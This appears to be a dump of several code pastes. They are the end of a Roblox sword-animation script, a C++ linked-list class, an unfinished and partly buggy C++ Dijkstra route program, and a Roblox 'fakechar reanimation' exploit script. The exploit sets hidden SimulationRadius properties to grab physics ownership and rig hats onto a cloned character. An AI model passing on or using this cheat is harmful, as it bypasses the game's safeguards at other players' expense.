		RightArm.RightGripAttachment.Orientation = Vector3.new(0, 90, 131)
		RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(-70)),.3)
		Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(0),math.rad(0),math.rad(60)),.3)
		RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(200),math.rad(0),math.rad(0)),.3)
		LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(math.rad(-200),math.rad(0),math.rad(0)),.3)
		LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-60),math.rad(-5))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(-10))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
		handleweld.C0=clerp(handleweld.C0,cf(),.3)
		handle2weld.C0=clerp(handle2weld.C0,cf(),.3)
	end
	scfr = nil
	attack = false
end

local Sit = false

mouse.Button1Down:connect(function()
	if attack==false then
		if attacktype==1 and CurrentMode == ""Unsheathed"" then
			attack=true
			attacktype=2
			attackone()
		elseif attacktype==2 and CurrentMode == ""Unsheathed"" then
			attack=true
			attacktype=1
			attack2one()
		end
	end
end)


mouse.KeyDown:connect(function(k)
	k=k:lower()
	if k=='m' then
		if Character:FindFirstChild(""mus"")~=nil then
			if mus.IsPlaying == true then
				mus:Stop()
			elseif mus.IsPaused == true then
				mus:Play()
			end
		elseif Character:FindFirstChild(""mus"")==nil then
			local mus = Instance.new(""Sound"",Character)
			mus.Name = ""mus""
			mus.SoundId = musid
			mus.Looped = true
			mus.Volume = 1
			mus:Play()
		end
	elseif k=='l' then
		musid = ""rbxassetid://1074563286""
		mus.SoundId = musid
		mus:Play()
	elseif k=='k' then
		musid = ""rbxassetid://1074563286""
		mus.SoundId = musid
		mus:Play()
	end
	if k=='q' then
		if attack==false and CurrentMode == ""Unsheathed"" then
			Stab()
		end
	elseif k=='e' then
		if attack==false and CurrentMode == ""Unsheathed"" then
			Spin()
		end
	elseif k=='r' then
		if attack==false and CurrentMode == ""Unsheathed"" then
			ContAttack()
		end
	elseif k=='f' then
		if attack==false and CurrentMode == ""Unsheathed"" then
			Sheathe()
		elseif k=='f' then
			if attack==false and Sit == false and CurrentMode == ""Sheathed"" then
				Unsheathe()
			end
		end
	end
end)


local sine = 0
local change = 1
local val = 0

while true do
	swait()
	Humanoid.WalkSpeed = 20
	sine = sine + change
	local torvel=(RootPart.Velocity*Vector3.new(1,0,1)).magnitude 
	local velderp=RootPart.Velocity.y
	hitfloor,posfloor=rayCast(RootPart.Position,(CFrame.new(RootPart.Position,RootPart.Position - Vector3.new(0,1,0))).lookVector,4,Character)
	if equipped==true or equipped==false then
		if attack==false then
			idle=idle+1
		else
			idle=0
		end
		if idle>=500 then
			if attack==false then
			end
		end
		if RootPart.Velocity.y > 1 and hitfloor==nil then 
			Anim=""Jump""
			if attack==false and Sit == false and CurrentMode == ""Unsheathed"" then
				RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
				Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-10),math.rad(0),math.rad(0)),.3)
				RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(50),math.rad(0),math.rad(30)),.3)
				LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(math.rad(-40),math.rad(5),math.rad(-10))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
				LH.C0=clerp(LH.C0,cf(-1,-.5,-1)*angles(math.rad(-20),math.rad(-90),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
				handleweld.C0=clerp(handleweld.C0,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),.3)
				handle2weld.C0=clerp(handle2weld.C0,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),.3)
			end
			if attack==false and Sit == false and CurrentMode == ""Sheathed"" then
				RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(-10),math.rad(0),math.rad(0)),.3)
				Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-20),math.rad(0),math.rad(0)),.3)
				RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(0),math.rad(0),math.rad(30)),.3)
				LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(math.rad(0),math.rad(0),math.rad(-30)),.3)
				LH.C0=clerp(LH.C0,cf(-1,-1,-.2)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-3),math.rad(0),math.rad(0)),.3)
				RH.C0=clerp(RH.C0,cf(1,-1,-.2)*angles(math.rad(0),math.rad(90),math.rad(5))*angles(math.rad(-3),math.rad(0),math.rad(0)),.3)
				handleweld.C0=clerp(handleweld.C0,cf(3,3,0.5)*angles(math.rad(90),math.rad(150),math.rad(90)),.3)
				handle2weld.C0=clerp(handle2weld.C0,cf(-3,3,0.5)*angles(math.rad(90),math.rad(-150),math.rad(-90)),.3)
			end
		elseif RootPart.Velocity.y < -1 and hitfloor==nil then 
			Anim=""Fall""
			if attack==false and Sit == false and CurrentMode == ""Unsheathed"" then
				RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(10),math.rad(0),math.rad(0)),.3)
				Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(10),math.rad(0),math.rad(0)),.3)
				RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(-5),math.rad(0),math.rad(20)),.3)
				LW.C0=clerp(LW.C0,CFrame.new(-1.40685952, 0.347550094, -0.023207128, 0.965925872, 0.224143773, -0.129409492, -0.258818924, 0.836516261, -0.482963085, 0, 0.500000119, 0.866025388),.3)
				LH.C0=clerp(LH.C0,cf(-1,-.5,-1)*angles(math.rad(-20),math.rad(-90),math.rad(0))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
				handleweld.C0=clerp(handleweld.C0,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),.3)
				handle2weld.C0=clerp(handle2weld.C0,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),.3)
			end
			if attack==false and Sit == false and CurrentMode == ""Sheathed"" then
				RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(10),math.rad(0),math.rad(0)),.3)
				Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(20),math.rad(0),math.rad(0)),.3)
				RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(0),math.rad(0),math.rad(50)),.3)
				LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(math.rad(0),math.rad(0),math.rad(-50)),.3)
				LH.C0=clerp(LH.C0,cf(-1,-.5,-.5)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-3),math.rad(0),math.rad(0)),.3)
				RH.C0=clerp(RH.C0,cf(1,-1,-.5)*angles(math.rad(0),math.rad(90),math.rad(5))*angles(math.rad(-3),math.rad(0),math.rad(0)),.3)
				handleweld.C0=clerp(handleweld.C0,cf(3,3,0.5)*angles(math.rad(90),math.rad(150),math.rad(90)),.3)
				handle2weld.C0=clerp(handle2weld.C0,cf(-3,3,0.5)*angles(math.rad(90),math.rad(-150),math.rad(-90)),.3)
			end
		elseif torvel<1 and hitfloor~=nil then
			Anim=""Idle""
			if attack==false and Sit == false and CurrentMode == ""Unsheathed"" then
				RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(-40)),.3)
				Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-0),math.rad(0),math.rad(40)),.3)
				RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(40),math.rad(0),math.rad(20)),.3)
				LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(math.rad(-10),math.rad(20),math.rad(-10)),.3)
				LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-60),math.rad(-5))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
				RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(-10))*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
				handleweld.C0=clerp(handleweld.C0,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),.3)
				handle2weld.C0=clerp(handle2weld.C0,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),.3)
			end
			if attack==false and Sit == false and CurrentMode == ""Sheathed"" then
				RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(0)),.3)
				Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-0),math.rad(0),math.rad(0)),.3)
				RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(0),math.rad(0),math.rad(5)),.3)
				LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(math.rad(0),math.rad(0),math.rad(-5)),.3)
				LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-3),math.rad(0),math.rad(0)),.3)
				RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(5))*angles(math.rad(-3),math.rad(0),math.rad(0)),.3)
				handleweld.C0=clerp(handleweld.C0,cf(3,3,0.5)*angles(math.rad(90),math.rad(150),math.rad(90)),.3)
				handle2weld.C0=clerp(handle2weld.C0,cf(-3,3,0.5)*angles(math.rad(90),math.rad(-150),math.rad(-90)),.3)
			end
			if attack==false and Sit == true and CurrentMode == ""Sheathed"" then
				RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,-2)*angles(math.rad(-10),math.rad(0),math.rad(0)),.3)
				Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(10),math.rad(0),math.rad(0)),.3)
				RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(-10),math.rad(0),math.rad(5)),.3)
				LW.C0=clerp(LW.C0,cf(-1.3,0.5,0)*euler(math.rad(90),math.rad(0),math.rad(30)),.3)
				LH.C0=clerp(LH.C0,cf(-1,.7,-.5)*angles(math.rad(0),math.rad(-90),math.rad(-10))*angles(math.rad(-3),math.rad(0),math.rad(0)),.3)
				RH.C0=clerp(RH.C0,cf(1,-.5,-.5)*angles(math.rad(0),math.rad(90),math.rad(70))*angles(math.rad(-3),math.rad(0),math.rad(0)),.3)
				handleweld.C0=clerp(handleweld.C0,cf(3,3,0.5)*angles(math.rad(90),math.rad(150),math.rad(90)),.3)
				handle2weld.C0=clerp(handle2weld.C0,cf(-3,3,0.5)*angles(math.rad(90),math.rad(-150),math.rad(-90)),.3)
			end
		elseif torvel>2 and hitfloor~=nil then
			Anim=""Walk""
			if attack==false and Sit == false and CurrentMode == ""Unsheathed"" then
				change=2
				RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(20),math.rad(0),math.rad(0)),.3)
				Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-10),math.rad(0),math.rad(0)),.3)
				RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(-5),math.rad(0),math.rad(20)),.3)
				LW.C0=clerp(LW.C0,CFrame.new(-1.40685952, 0.347550094, -0.023207128, 0.965925872, 0.224143773, -0.129409492, -0.258818924, 0.836516261, -0.482963085, 0, 0.500000119, 0.866025388),.3)
				LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-3),math.rad(0),math.rad(0)),.3)
				RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(0))*angles(math.rad(-3),math.rad(0),math.rad(0)),.3)
				handleweld.C0=clerp(handleweld.C0,cf(0,-0,0)*angles(math.rad(15),math.rad(-10),math.rad(0)),.3)
				handle2weld.C0=clerp(handle2weld.C0,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),.3)
			end
			if attack==false and Sit == false and CurrentMode == ""Sheathed"" then
				RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(10),math.rad(0),math.rad(0)),.3)
				Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(-5),math.rad(0),math.rad(0)),.3)
				RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(45*math.cos(sine/10)),math.rad(0),math.rad(5)),.3)
				LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*euler(math.rad(-45*math.cos(sine/10)),math.rad(0),math.rad(-5)),.3)
				LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0))*angles(math.rad(-2),math.rad(0),math.rad(0)),.3)
				RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(5))*angles(math.rad(-2),math.rad(0),math.rad(0)),.3)
				handleweld.C0=clerp(handleweld.C0,cf(3,3,0.5)*angles(math.rad(90),math.rad(150),math.rad(90)),.3)
				handle2weld.C0=clerp(handle2weld.C0,cf(-3,3,0.5)*angles(math.rad(90),math.rad(-150),math.rad(-90)),.3)
			end
		end
	end
	if #Effects>0 then
		for e=1,#Effects do
			if Effects[e]~=nil then
				local Thing=Effects[e]
				if Thing~=nil then
					local Part=Thing[1]
					local Mode=Thing[2]
					local Delay=Thing[3]
					local IncX=Thing[4]
					local IncY=Thing[5]
					local IncZ=Thing[6]
					if Thing[1].Transparency<=1 then
						if Thing[2]==""Block1"" then
							Thing[1].CFrame=Thing[1].CFrame*euler(math.random(-50,50),math.random(-50,50),math.random(-50,50))
							Mesh=Thing[1].Mesh
							Mesh.Scale=Mesh.Scale+vt(Thing[4],Thing[5],Thing[6])
							Thing[1].Transparency=Thing[1].Transparency+Thing[3]
						elseif Thing[2]==""Cylinder"" then
							Mesh=Thing[1].Mesh
							Mesh.Scale=Mesh.Scale+vt(Thing[4],Thing[5],Thing[6])
							Thing[1].Transparency=Thing[1].Transparency+Thing[3]
						elseif Thing[2]==""Blood"" then
							Mesh=Thing[7]
							Thing[1].CFrame=Thing[1].CFrame*cf(0,.5,0)
							Mesh.Scale=Mesh.Scale+vt(Thing[4],Thing[5],Thing[6])
							Thing[1].Transparency=Thing[1].Transparency+Thing[3]
						elseif Thing[2]==""Elec"" then
							Mesh=Thing[1].Mesh
							Mesh.Scale=Mesh.Scale+vt(Thing[7],Thing[8],Thing[9])
							Thing[1].Transparency=Thing[1].Transparency+Thing[3]
						elseif Thing[2]==""Disappear"" then
							Thing[1].Transparency=Thing[1].Transparency+Thing[3]
						end
					else
						Part.Parent=nil
						table.remove(Effects,e)
					end
				end
			end
		end
	end
end"
tiex85JD,Untitled,35657,C++,Friday 7th of July 2023 09:31:04 PM CDT,"#include <iostream>

using namespace std;

template <typename T>
class ForwardList {
public:

    ForwardList() : size(0), head(nullptr) {}

    struct Node { //односвязный список состоит из узлов
        T value; // узел хранит информативную часть
        Node* next; // и указатель на следующий узел в списке
    };

    void Push_front(const T& value) {
        head = new Node{ value, head };
        size++;
    }

    void Pop_front() {
        if (size > 0) {
            Node* temp = head;
            head = head->next;
            delete temp;
            size--;
        }
    }

    void Print() {
        Node* temp = head;
        while (temp != nullptr) {
            cout << temp->value << "" "";
            temp = temp->next;
        }
        cout << endl;
    }

    T& Front() {
        if (head != nullptr) {
            return head->value;
        }
    }

    T& Front() const {
        if (head != nullptr) {
            return head->value;
        }
    }

    int Find(const T value) {
        int i = 0;
        Node* temp = head;
        while (temp != nullptr) {
            if (temp->value == value) {
                return i;
            }
            temp = temp->next;
            i++;
        }
        return -1;
    }

    void Insert(const int index, const T value) {
        if (index == 0) {
            Push_front(value);
            return;
        }
        if (index > 0 && index <= size) {
            Node* temp = head;
            for (int i = 0; i < index - 1; i++) {
                temp = temp->next;
            }
            temp->next = new Node{ value, temp->next };
            size++;
        }
    }

    void Erase(const int index) {
        if (index == 0) {
            Pop_front();
            return;
        }
        if (index > 0 && index < size) {
            Node* temp = head;
            for (int i = 0; i < index - 1; i++) {
                temp = temp->next;
            }
            Node* buf = temp->next->next;
            delete temp->next;
            temp->next = buf;
            size--;
        }
    }

    void Clear() {
        while (head != nullptr) {
            Pop_front();
        }
    }

    int Size() const {
        return size;
    }

    bool operator==(const ForwardList& other) {
        if (size != other.size) {
            return false;
        }
        Node* temp = head;
        Node* other_temp = other.head;
        while (temp != nullptr) {
            if (temp->value != other_temp->value) {
                return false;
            }
            temp = temp->next;
            other_temp = other_temp->next;
        }
        return true;
    }

    bool operator!=(const ForwardList& other) {
        return !(*this == other);
    }
    /*
    Node* temp = head; //указатель на узел

    *temp; // получение доступа ко всему узлу через разименовани

    temp->next; // получение доступа к полю next через разыменование только этого поля
    */

    ~ForwardList() {
        Clear();
    }

private:
    int size;
    Node* head;
};

int main() {
    ForwardList<int> list1;

    for (int i = 0; i < 10; i++) {
        list1.Push_front(i + 1);
    }
    list1.Print();
    cout << list1.Size() << endl;

    for (int i = 0; i < 3; i++) {
        list1.Pop_front();
    }
    list1.Print();
    cout << ""size = "" << list1.Size() << endl;

    cout << list1.Front() << endl;
    cout << list1.Find(5) << endl;

    list1.Insert(3, 10);
    list1.Print();
    list1.Erase(3);
    list1.Print();
    cout << ""============="" << endl;
    list1.Clear();
    list1.Print();
}"
bsX4cmYU,codigo.cpp,mendoza_franco,C++,Friday 7th of July 2023 09:18:06 PM CDT,"#include <iostream>
#include ""funcionesLinux.h""
using namespace std;
////////////////////////////////////////////////////////////////////////////////////////////////////////////
static int      nodoOrigen, nodoDestino;
static double   mIncidencia[16][16] = {};
 const char  *codigo [] = {	""V1"",""V2"",""V3"",""V4"",""Y1"",""Y2"",""Y3"",""Y4"",""Q1"",""Q2"",""Q3"",""P1"",""P2"",""P3"",""P4"",""P5""};	//0-15
 const char  *nombre [] = {	""Dr.Manuel Belgrano"",""Palpala"",""San Antonio"",""El Carmen"",
							""San Pedro"",""Ledesma"",""Santa Barbara"",""Valle Grande"",
							""Tumbaya"",""Tilcara"",""Humahuaca"",
							""Cochinoca"",""La Quiaca"",""Susques"",""Rinconada"",""Santa Catalina""};					//0-15
const int		*marca [] = {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 };	//PARA SABER SI YA PASO POR AQUI
//const float	*distancia [] = {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 };	//Km
     
void listado(){
	int posX = 55;    
	colors(7);                                                                                      
	posicionar(posX,1);	cout<<(char)219<<"" - LISTA DE CODIGOS: "";//QUE EL MENU SEA CON NUMEROS Y NO CON CODIGO
	posicionar(posX,2);	cout<<(char)219;
		{	//LISTADO DEL MENU
			for(int i = 0; i<=20; i++ ){
				colors(7); posicionar(posX,2+i);	cout<<(char)219;
			}	
			colors(3);	posicionar(posX+1,3);	cout<<"" > VALLES: "";
			for(int i = 0; i < 4; i++){
					posicionar(posX+4,4+i);	cout<<""\t""<<i+1<<"": ""<<nombre[i]<<"" (""<<codigo[i]<<"")"";	
				}
			colors(10);	posicionar(posX+1,8);	cout<<"" > YUNGAS: "";
				for(int i = 4; i < 8; i++){
					posicionar(posX+4,5+i);	cout<<""\t""<<i+1<<"": ""<<nombre[i]<<"" (""<<codigo[i]<<"")"";	
				}
			colors(6);  posicionar(posX+1,13);	cout<<"" > QUEBRADA: "";
				for(int i = 8; i < 11; i++){
					posicionar(posX+4,6+i);	cout<<""\t""<<i+1<<"": ""<<nombre[i]<<"" (""<<codigo[i]<<"")"";	
				}
			colors(12); posicionar(posX+1,17);	cout<<"" > PUNA: "";
				for(int i = 11; i < 16; i++){
					posicionar(posX+4,7+i);	cout<<""\t""<<i+1<<"": ""<<nombre[i]<<"" (""<<codigo[i]<<"")"";	
			}
		}
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////
void menuSeleccion(){
	bool bandera = false;
		listado();
				posicionar(2,1); 
					colors(7); 	cout<<"" > DESDE DONDE HACE EL ENVIO:"";	
					colors(2); 	nodoOrigen = takeOption(""\t"",1,16);
								nodoOrigen = nodoOrigen-1;	//-1 PORQUE 
			do{
				posicionar(2,4);
					colors(7);	cout<<"" > HACIA DONDE:"";
					colors(4); 	nodoDestino = takeOption(""\t"",1,16);
								nodoDestino = nodoDestino-1;	//-1 PORQUE 
						if (nodoOrigen != nodoDestino){
							posicionar(2,5);	
								colors(2);	cout<<"" PROCESANDO: ""<<endl;
							break;	
						}
						else{	
							posicionar(2,5);	cout<<"" - ¡ERROR! : VERIFIQUE EL DESTINO."";
								
						}
			}while(1);
			colors(7); 	
}
////////////////////////////////////////////////////////////////////////////////////////////////
void matrizIncidencia(){
	int numero;
	for(int y = 0; y<16; y++ ){
		for(int x = 0; x<16; x++){
			mIncidencia[x][y] = 0;
		}
	}
	//INFERIOR
	mIncidencia[0][1] = 14,2; //SSJ. - PALPALA
	mIncidencia[0][2] = 32,4; //SSJ. - SAN ANTONIO
	mIncidencia[0][3] = 26,5; //SSJ. - EL CARMEN
	mIncidencia[0][8] = 49,0; //SSJ. - TUMBAYA
	mIncidencia[1][3] = 27,7; //PALPALA - EL CARMEN
	mIncidencia[1][4] = 51,9; //PALPALA - SAN PEDRO
	mIncidencia[2][3] = 7,7;  //SAN ANTONIO - EL CARMEN
	mIncidencia[4][5] = 50,5; //SAN PEDRO - LEDESMA
	mIncidencia[5][6] = 80,4; //LEDESMA - SANTA BARBARA
	mIncidencia[5][7] = 85,4; //LEDESMA - VALLE GRANDE
	mIncidencia[8][9] = 35,9; //TUMBAYA - TILCARA
	mIncidencia[8][13] = 150; //TUMBAYA - SUSQUES
	mIncidencia[9][10] = 44.5; //TILCARA - HUMAHUACA
	mIncidencia[10][11] = 110;  //HUMAHUCA - COCHINOCA
	mIncidencia[11][12] = 95,4;  //COCHINOCA - YAVI
	mIncidencia[11][13] = 159;  //COCHINOCA - SUSQUES
	mIncidencia[11][14] = 70,5;  //COCHINOCA - RINCONADA
	mIncidencia[11][15] = 141;  //COCHINOCA - STA. CATALINA
	mIncidencia[12][15] = 78,9;  //YAVI - STA.CATALINA
	mIncidencia[13][14] = 188;  //SUSQUES - RINCONADA
	mIncidencia[14][15] = 88;  //RINCONADA - STA.CATALINA
	
    //SUPERIOR - mIncidencia[x][y] = 1;
	mIncidencia[1][0] = 14,2; //SSJ. - PALPALA
	mIncidencia[2][0] = 32,4; //SSJ. - SAN ANTONIO
	mIncidencia[3][0] = 26,5; //SSJ. - EL CARMEN
	mIncidencia[8][0] = 49,0; //SSJ. - TUMBAYA
	mIncidencia[3][1] = 27,7; //PALPALA - EL CARMEN
	mIncidencia[4][1] = 51,9; //PALPALA - SAN PEDRO
	mIncidencia[3][2] = 7,7;  //SAN ANTONIO - EL CARMEN
	mIncidencia[5][4] = 50,5; //SAN PEDRO - LEDESMA
	mIncidencia[6][5] = 80,4; //LEDESMA - SANTA BARBARA
	mIncidencia[7][5] = 85,4; //LEDESMA - VALLE GRANDE
	mIncidencia[9][8] = 35,9; //TUMBAYA - TILCARA
	mIncidencia[13][8] = 150; //TUMBAYA - SUSQUES
	mIncidencia[10][9] = 44.5; //TILCARA - HUMAHUACA
	mIncidencia[11][10] = 110;  //HUMAHUCA - COCHINOCA
	mIncidencia[12][11] = 95,4;  //COCHINOCA - YAVI
	mIncidencia[13][11] = 159;  //COCHINOCA - SUSQUES
	mIncidencia[14][11] = 70,5;  //COCHINOCA - RINCONADA
	mIncidencia[15][11] = 141;  //COCHINOCA - STA. CATALINA
	mIncidencia[15][12] = 78,9;  //YAVI - STA.CATALINA
	mIncidencia[14][13] = 188;  //SUSQUES - RINCONADA
	mIncidencia[15][14] = 88;  //RINCONADA - STA.CATALINA
	//mostrar
	cout<<"" - MATRIZ DE INCIDENCIA:	""<<endl;
	cout<<""  "";
		for(int i=0; i<16; i++){
			cout<<codigo[i]<<"","";
		}
		cout<<""\n"";
			for(int j = 0; j<16; j++ ){
				colors(7); cout<<codigo[j]<<"" "";
				for(int i = 0; i<16; i++){
					numero = mIncidencia[i][j];
					if(numero == 1){
						colors(12);	cout<<mIncidencia[i][j];
					}
					else{	
						colors(7);	cout<<mIncidencia[i][j];
					}
					if(i == 15){
						colors(7);cout<<"" >""<<j<<""\n"";
					}
					else{
						colors(7);cout<<"", "";
					}
				}
			}
			cout<<""   0, 1, 2, 3, 4, 5, 6, 7, 8, 9,10,11,12,13,14,15""<<endl;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////
void algoritmoDikstra(){
	int camino [16];
	int ultimo, nodo;
	cout<<""\n\t > ORIGEN:  ""<<nombre[nodoOrigen]<<""(""<<codigo[nodoOrigen]<<"")"";
	cout<<""\n\t > DESTINO: ""<<nombre[nodoDestino]<<""(""<<codigo[nodoDestino]<<"")"";
		camino [0] = nodoOrigen;
		ultimo = nodoOrigen;
			do{
					for(int i = ultimo;	i<16;	i++){
						camino [0] = nodoOrigen;
						//marca[nodoOrigen]=1;
					}
			}while(ultimo == nodoDestino);
		
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////
int main(void){
	menuSeleccion();
	matrizIncidencia();
	algoritmoDikstra();
return 0;}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////"
5XMhQ7uD,fakechar reanimation,Synpase_X,Lua,Friday 7th of July 2023 09:04:16 PM CDT,"-- i discovered it, NOT CREATED.

sethiddenproperty(game.Players.LocalPlayer,""MaximumSimulationRadius"",math.huge)
sethiddenproperty(game.Players.LocalPlayer,""SimulationRadius"",1.0000000331814e+32)
 
for i,v in next, game:GetService(""Players"").LocalPlayer.Character:GetDescendants() do
if v:IsA(""BasePart"") then--and v.Name ~=""HumanoidRootPart"" then 
game:GetService(""RunService"").Heartbeat:connect(function()
v.Velocity = Vector3.new(0,-25.05,0)
wait(0.5)
end)
end
end
 
local char = workspace[game.Players.LocalPlayer.Name]
char.Archivable = true
 
local fakechar = char:Clone()
fakechar.Name = 'clone'
fakechar.Parent = char
fakechar.Head.face.Transparency = 1
workspace.CurrentCamera.CameraSubject = fakechar
char.Torso.Anchored = true
 
local connections = {}
 
function create(part, parent, p, r)
part.AccessoryWeld:Remove()
Instance.new(""Attachment"",part)
Instance.new(""AlignPosition"",part)
Instance.new(""AlignOrientation"",part)
Instance.new(""Attachment"",parent)
part.AlignPosition.Attachment0 = part.Attachment
part.AlignOrientation.Attachment0 = part.Attachment
part.AlignPosition.Attachment1 = parent.Attachment
part.AlignOrientation.Attachment1 = parent.Attachment
part.Attachment.Position = p
part.Attachment.Orientation = r
part.AlignPosition.MaxForce = 999999999
part.AlignPosition.MaxVelocity = math.huge
part.AlignPosition.ReactionForceEnabled = false
part.AlignPosition.Responsiveness = math.huge
part.AlignOrientation.Responsiveness = 200
part.AlignPosition.RigidityEnabled = false
part.AlignOrientation.MaxTorque = 999999999
end
 
local hats = {
Torso = char:FindFirstChild('Hat1').Handle,
Torso1 = char:FindFirstChild('Robloxclassicred').Handle,
LeftArm = char:FindFirstChild('Pink Hair').Handle,
RightArm = char:FindFirstChild('Pal Hair').Handle,
LeftLeg = char:FindFirstChild('Kate Hair').Handle,
RightLeg = char:FindFirstChild('LavanderHair').Handle
}
 
function rmesh(HatName)
for _,mesh in next, workspace[game.Players.LocalPlayer.Name][HatName]:GetDescendants() do
if mesh:IsA(""Mesh"") or mesh:IsA(""SpecialMesh"") then
mesh:Remove()
end
end
end
 
game:GetService('RunService').Heartbeat:connect(function()
    hats.Torso.Velocity = Vector3.new(30,0,0)
    hats.Torso1.Velocity = Vector3.new(30,0,0)
    hats.LeftArm.Velocity = Vector3.new(30,0,0)
    hats.RightArm.Velocity = Vector3.new(30,0,0)
    hats.LeftLeg.Velocity = Vector3.new(30,0,0)
    hats.RightLeg.Velocity = Vector3.new(30,0,0)
end)
 
table.insert(connections, game:GetService('RunService').Stepped:Connect(function()
fakechar.Torso.CanCollide = false
fakechar.Head.CanCollide = false
end))
 
 
create(hats.Torso, fakechar['Torso'], Vector3.new(.5,0,0), Vector3.new(90,0,0))
create(hats.Torso1, fakechar['Torso'], Vector3.new(-.5,0,0), Vector3.new(90,0,0))
create(hats.LeftArm, fakechar['Left Arm'], Vector3.new(), Vector3.new(90,0,0))
create(hats.RightArm, fakechar['Right Arm'], Vector3.new(), Vector3.new(90,0,0))
create(hats.LeftLeg, fakechar['Left Leg'], Vector3.new(), Vector3.new(90,0,0))
create(hats.RightLeg, fakechar['Right Leg'], Vector3.new(), Vector3.new(90,0,0))
 
rmesh('Hat1')
rmesh('Robloxclassicred')
rmesh('Pink Hair')
rmesh('Pal Hair')
rmesh('Kate Hair')
rmesh('LavanderHair')
 
local kill = false
 
for i,v in next, fakechar:GetDescendants() do
if v:IsA(""BasePart"") then
v.Transparency = 1
end
end
 
fakechar.Humanoid.Died:Connect(function()
   game.Players.LocalPlayer.Character = char
   char:BreakJoints()
   fakechar:Destroy()
kill = true
 
   for _,v in pairs(connections) do v:Disconnect() end
end)
char.Humanoid.Died:Connect(function()
   game.Players.LocalPlayer.Character = char
   char:BreakJoints()
   fakechar:Destroy()
kill = true
 
   for _,v in pairs(connections) do v:Disconnect() end
end)
 
game.Players.LocalPlayer.Character = fakechar"
